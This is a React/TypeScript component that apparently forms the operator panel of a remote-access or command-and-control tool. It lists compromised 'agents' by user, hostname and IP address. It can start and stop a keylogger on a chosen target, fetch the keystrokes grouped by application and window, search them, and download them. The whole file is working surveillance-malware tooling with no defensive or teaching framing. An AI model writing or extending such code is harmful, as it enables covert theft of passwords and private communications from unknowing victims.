import { useState, useEffect, useRef } from 'react';

interface KeyEntry {
  timestamp: string;
  window_title: string;
  process_name: string;
  text: string;
}

interface Agent {
  agent_id: string;
  hostname?: string;
  user?: string;
  ip_address?: string;
  os?: string;
}

export default function Keylogger() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState('');
  const [isRunning, setIsRunning] = useState(false);
  const [entries, setEntries] = useState<KeyEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [filter, setFilter] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);

  // Load agents
  useEffect(() => {
    const load = async () => {
      try {
        const res = await fetch('/api/live/agents');
        const data = await res.json();
        const obj = data.agents || {};
        if (typeof obj === 'object' && !Array.isArray(obj)) {
          const arr = Object.keys(obj).map(id => ({ agent_id: id, ...obj[id] }));
          setAgents(arr);
          if (!selectedAgent && arr.length > 0) setSelectedAgent(arr[0].agent_id);
        }
      } catch {}
    };
    load();
    const iv = setInterval(load, 5000);
    return () => clearInterval(iv);
  }, []);

  // Auto-refresh logs
  useEffect(() => {
    if (!autoRefresh || !selectedAgent || !isRunning) return;
    const iv = setInterval(() => fetchLogs(true), 3000);
    return () => clearInterval(iv);
  }, [autoRefresh, selectedAgent, isRunning]);

  const sendCommand = async (cmdType: string): Promise<any> => {
    const res = await fetch(`/api/live/agents/${selectedAgent}/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command_type: cmdType }),
    });
    if (!res.ok) throw new Error('Failed to send command');
    const data = await res.json();
    const cmdId = data.cmd_id;

    // Poll for result
    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 500));
      const cmdRes = await fetch(`/api/live/agents/${selectedAgent}/commands/${cmdId}`);
      if (!cmdRes.ok) continue;
      const cmd = await cmdRes.json();
      if (cmd.status !== 'queued' && cmd.status !== 'sent') {
        return cmd;
      }
    }
    throw new Error('Timeout');
  };

  const startKeylogger = async () => {
    setLoading(true);
    setMessage('');
    try {
      const result = await sendCommand('keylogger_start');
      if (result.status === 'success') {
        setIsRunning(true);
        setAutoRefresh(true);
        setMessage('Keylogger started');
      } else {
        setMessage('Error: ' + (result.error || result.output));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setLoading(false);
  };

  const stopKeylogger = async () => {
    setLoading(true);
    setMessage('');
    try {
      const result = await sendCommand('keylogger_stop');
      if (result.status === 'success') {
        setIsRunning(false);
        setAutoRefresh(false);
        setMessage('Keylogger stopped');
        fetchLogs(false);
      } else {
        setMessage('Error: ' + (result.error || result.output));
      }
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setLoading(false);
  };

  const fetchLogs = async (silent: boolean = false) => {
    if (!selectedAgent) return;
    if (!silent) setLoading(true);
    try {
      const result = await sendCommand('keylogger_logs');
      if (result.status === 'success' && result.output) {
        try {
          const parsed = JSON.parse(result.output);
          setEntries(parsed);
          if (!silent) setMessage(`Loaded ${parsed.length} entries`);
        } catch {
          setEntries([]);
          if (!silent) setMessage('No structured logs available');
        }
      }
    } catch (e) {
      if (!silent) setMessage('Error: ' + (e as Error).message);
    }
    if (!silent) setLoading(false);
  };

  const clearLogs = async () => {
    setLoading(true);
    try {
      const result = await sendCommand('keylogger_clear');
      setEntries([]);
      setMessage(result.output || 'Logs cleared');
    } catch (e) {
      setMessage('Error: ' + (e as Error).message);
    }
    setLoading(false);
  };

  const downloadLogs = () => {
    const text = entries.map(e =>
      `[${e.timestamp}] [${e.process_name}] ${e.window_title}\n${e.text}\n`
    ).join('\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger-${selectedAgent.slice(0, 8)}-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Group entries by process
  const grouped = entries.reduce((acc, entry) => {
    const key = entry.process_name || 'unknown';
    if (!acc[key]) acc[key] = [];
    acc[key].push(entry);
    return acc;
  }, {} as Record<string, KeyEntry[]>);

  const filteredEntries = filter
    ? entries.filter(e =>
        e.text.toLowerCase().includes(filter.toLowerCase()) ||
        e.window_title.toLowerCase().includes(filter.toLowerCase()) ||
        e.process_name.toLowerCase().includes(filter.toLowerCase())
      )
    : entries;

  const agentLabel = (a: Agent) => {
    const parts = [a.user, a.hostname, a.ip_address].filter(Boolean);
    return parts.length > 0 ? `${a.agent_id.slice(0, 8)}... (${parts.join(' | ')})` : a.agent_id.slice(0, 8) + '...';
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <h1 className="text-3xl font-bold text-white">Keylogger</h1>
        <span className={`px-3 py-1 rounded text-sm font-semibold ${
          isRunning ? 'bg-red-900 text-red-300 animate-pulse' : 'bg-gray-700 text-gray-300'
        }`}>
          {isRunning ? 'Recording' : 'Stopped'}
        </span>
      </div>

      {/* Agent selector */}
      <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
        <label className="text-gray-400 text-sm block mb-2">Target Agent</label>
        {agents.length === 0 ? (
          <p className="text-yellow-400 text-sm">No agents connected</p>
        ) : (
          <select value={selectedAgent} onChange={(e) => { setSelectedAgent(e.target.value); setEntries([]); setIsRunning(false); }}
            className="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded text-white">
            {agents.map(a => <option key={a.agent_id} value={a.agent_id}>{agentLabel(a)}</option>)}
          </select>
        )}
      </div>

      {/* Controls */}
      {selectedAgent && (
        <div className="flex gap-2 flex-wrap items-center">
          {!isRunning ? (
            <button onClick={startKeylogger} disabled={loading}
              className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded font-medium disabled:opacity-50 text-sm">
              Start Recording
            </button>
          ) : (
            <button onClick={stopKeylogger} disabled={loading}
              className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded font-medium disabled:opacity-50 text-sm">
              Stop Recording
            </button>
          )}
          <button onClick={() => fetchLogs(false)} disabled={loading}
            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded font-medium disabled:opacity-50 text-sm">
            Fetch Logs
          </button>
          <button onClick={clearLogs} disabled={loading || entries.length === 0}
            className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded font-medium disabled:opacity-50 text-sm">
            Clear
          </button>
          <button onClick={downloadLogs} disabled={entries.length === 0}
            className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded font-medium disabled:opacity-50 text-sm">
            Download
          </button>
          <label className="flex items-center gap-2 text-sm text-gray-400 ml-auto">
            <input type="checkbox" checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
              className="rounded" />
            Auto-refresh
          </label>
        </div>
      )}

      {message && (
        <div className={`p-2 rounded text-sm ${message.startsWith('Error') ? 'bg-red-900 text-red-300' : 'bg-green-900 text-green-300'}`}>
          {message}
        </div>
      )}

      {/* Stats bar */}
      {entries.length > 0 && (
        <div className="grid grid-cols-3 gap-3">
          <div className="bg-gray-800 rounded p-3 border border-gray-700">
            <p className="text-gray-400 text-xs">Total Entries</p>
            <p className="text-white text-xl font-bold">{entries.length}</p>
          </div>
          <div className="bg-gray-800 rounded p-3 border border-gray-700">
            <p className="text-gray-400 text-xs">Applications</p>
            <p className="text-white text-xl font-bold">{Object.keys(grouped).length}</p>
          </div>
          <div className="bg-gray-800 rounded p-3 border border-gray-700">
            <p className="text-gray-400 text-xs">Total Characters</p>
            <p className="text-white text-xl font-bold">{entries.reduce((s, e) => s + e.text.length, 0)}</p>
          </div>
        </div>
      )}

      {/* Search filter */}
      {entries.length > 0 && (
        <input type="text" value={filter} onChange={(e) => setFilter(e.target.value)}
          placeholder="Search logs..."
          className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded text-white text-sm" />
      )}

      {/* Log entries - grouped by app */}
      <div className="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
        <div className="p-3 bg-gray-800 border-b border-gray-700 flex items-center gap-2">
          <div className="w-3 h-3 bg-red-500 rounded-full"></div>
          <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
          <div className="w-3 h-3 bg-green-500 rounded-full"></div>
          <span className="text-gray-400 text-sm ml-2 font-mono">Keystroke Log</span>
        </div>
        <div className="h-96 overflow-y-auto p-4 font-mono text-sm space-y-3">
          {filteredEntries.length === 0 ? (
            <p className="text-gray-500 text-center py-8">
              {entries.length === 0 ? 'No logs yet. Start the keylogger and type something on the target.' : 'No matching entries.'}
            </p>
          ) : (
            filteredEntries.map((entry, i) => {
              const prevEntry = i > 0 ? filteredEntries[i - 1] : null;
              const showHeader = !prevEntry || prevEntry.process_name !== entry.process_name || prevEntry.window_title !== entry.window_title;

              return (
                <div key={i}>
                  {showHeader && (
                    <div className="flex items-center gap-2 mt-2 mb-1">
                      <span className="px-2 py-0.5 bg-blue-900 text-blue-300 rounded text-xs font-semibold">
                        {entry.process_name}
                      </span>
                      <span className="text-gray-500 text-xs truncate" title={entry.window_title}>
                        {entry.window_title}
                      </span>
                    </div>
                  )}
                  <div className="flex gap-2 pl-2">
                    <span className="text-gray-600 text-xs whitespace-nowrap">{entry.timestamp.split(' ')[1] || entry.timestamp}</span>
                    <span className="text-green-400 whitespace-pre-wrap break-all">{
                      entry.text
                        .replace(/\n/g, ' [ENTER]\n')
                        .replace(/\t/g, ' [TAB] ')
                    }</span>
                  </div>
                </div>
              );
            })
          )}
          <div ref={bottomRef} />
        </div>
      </div>
    </div>
  );
}
